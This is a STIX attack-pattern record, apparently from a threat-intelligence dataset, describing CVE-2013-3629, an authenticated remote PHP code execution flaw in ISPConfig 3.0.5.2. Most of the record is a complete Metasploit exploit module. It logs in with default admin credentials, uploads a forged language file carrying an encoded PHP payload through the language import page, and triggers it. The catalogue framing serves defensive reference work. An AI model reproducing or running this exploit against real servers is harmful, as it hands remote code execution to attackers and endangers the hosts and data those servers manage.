{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8b13890a-8687-4c90-a312-fd9bc5c0fee8",
    "created": "2024-08-14T17:09:10.922544Z",
    "modified": "2024-08-14T17:09:10.922548Z",
    "name": "ISPConfig Authenticated Arbitrary PHP Code Execution",
    "description": " ISPConfig allows an authenticated administrator to export language settings into a PHP script which is intended to be reuploaded later to restore language settings. This feature can be abused to run aribitrary PHP code remotely on the ISPConfig server.  This module was tested against version 3.0.5.2. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/ispconfig_php_exec.rb",
            "external_id": "ispconfig_php_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-3629"
        },
        {
            "source_name": "reference",
            "url": "https://www.rapid7.com/blog/post/2013/10/30/seven-tricks-and-treats"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name' => 'ISPConfig Authenticated Arbitrary PHP Code Execution',\n      'Description' => %q{\n      ISPConfig allows an authenticated administrator to export language settings into a PHP script\n      which is intended to be reuploaded later to restore language settings. This feature\n      can be abused to run aribitrary PHP code remotely on the ISPConfig server.\n\n      This module was tested against version 3.0.5.2.\n      },\n      'Author' =>\n        [\n          'Brandon Perry <bperry.volatile[at]gmail.com>' # Discovery / msf module\n        ],\n      'License' => MSF_LICENSE,\n      'References' =>\n        [\n          ['CVE', '2013-3629'],\n          ['URL', 'https://www.rapid7.com/blog/post/2013/10/30/seven-tricks-and-treats']\n        ],\n      'Privileged' => false,\n      'Platform'\t => ['php'],\n      'Arch'\t\t\t => ARCH_PHP,\n      'Payload'\t\t=>\n        {\n          'BadChars' => \"&\\n=+%\",\n        },\n      'Targets' =>\n        [\n          [ 'Automatic', { } ],\n        ],\n      'DefaultTarget'\t=> 0,\n      'DisclosureDate' => '2013-10-30'))\n      register_options(\n      [\n        OptString.new('TARGETURI', [ true, \"Base ISPConfig directory path\", '/']),\n        OptString.new('USERNAME', [ true, \"Username to authenticate with\", 'admin']),\n        OptString.new('PASSWORD', [ false, \"Password to authenticate with\", 'admin']),\n        OptString.new('LANGUAGE', [ true, \"The language to use to trigger the payload\", 'es'])\n      ])\n  end\n\n  def lng\n    datastore['LANGUAGE']\n  end\n\n  def exploit\n\n    init = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, '/index.php')\n    })\n\n    if !init or init.code != 200\n      fail_with(Failure::UnexpectedReply, \"Error getting initial page.\")\n    end\n\n    sess = init.get_cookies\n\n    post = {\n      'username' => datastore[\"USERNAME\"],\n      'passwort' => datastore[\"PASSWORD\"],\n      's_mod' => 'login',\n      's_pg' => 'index'\n    }\n\n    print_status(\"Authenticating as user: \" << datastore[\"USERNAME\"])\n\n    login = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, '/content.php'),\n      'vars_post' => post,\n      'cookie' => sess\n    })\n\n    if !login or login.code != 200\n      fail_with(Failure::NoAccess, \"Error authenticating.\")\n    end\n\n    sess = login.get_cookies\n    fname = rand_text_alphanumeric(rand(10)+6) + '.lng'\n    php = \"---|ISPConfig Language File|3.0.5.2|#{lng}\\n\"\n    php << \"--|global|#{lng}|#{lng}.lng\\n\"\n    php << \"<?php \\n\"\n    php << payload.encoded\n    php << \"?>\\n\"\n    php << \"--|mail|#{lng}|#{lng}.lng\\n\"\n    php << \"<?php\"\n    php << \"?>\"\n\n    data = Rex::MIME::Message.new\n    data.add_part(php, 'application/x-php', nil, \"form-data; name=\\\"file\\\"; filename=\\\"#{fname }\\\"\")\n    data.add_part('1', nil, nil, 'form-data; name=\"overwrite\"')\n    data.add_part('1', nil, nil, 'form-data; name=\"ignore_version\"')\n    data.add_part('', nil, nil, 'form-data; name=\"id\"')\n\n    data_post = data.to_s\n\n    print_status(\"Sending payload\")\n    send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, '/admin/language_import.php'),\n      'ctype' => \"multipart/form-data; boundary=#{data.bound}\",\n      'data' => data_post,\n      'cookie' => sess\n    })\n\n    post = {\n      'lng_select' => 'es'\n    }\n\n    print_status(\"Triggering payload...\")\n    send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, '/admin/language_complete.php'),\n      'vars_post' => post,\n      'cookie' => sess\n    })\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-10-30",
    "x_mitre_platforms": [
        "['php']"
    ]
}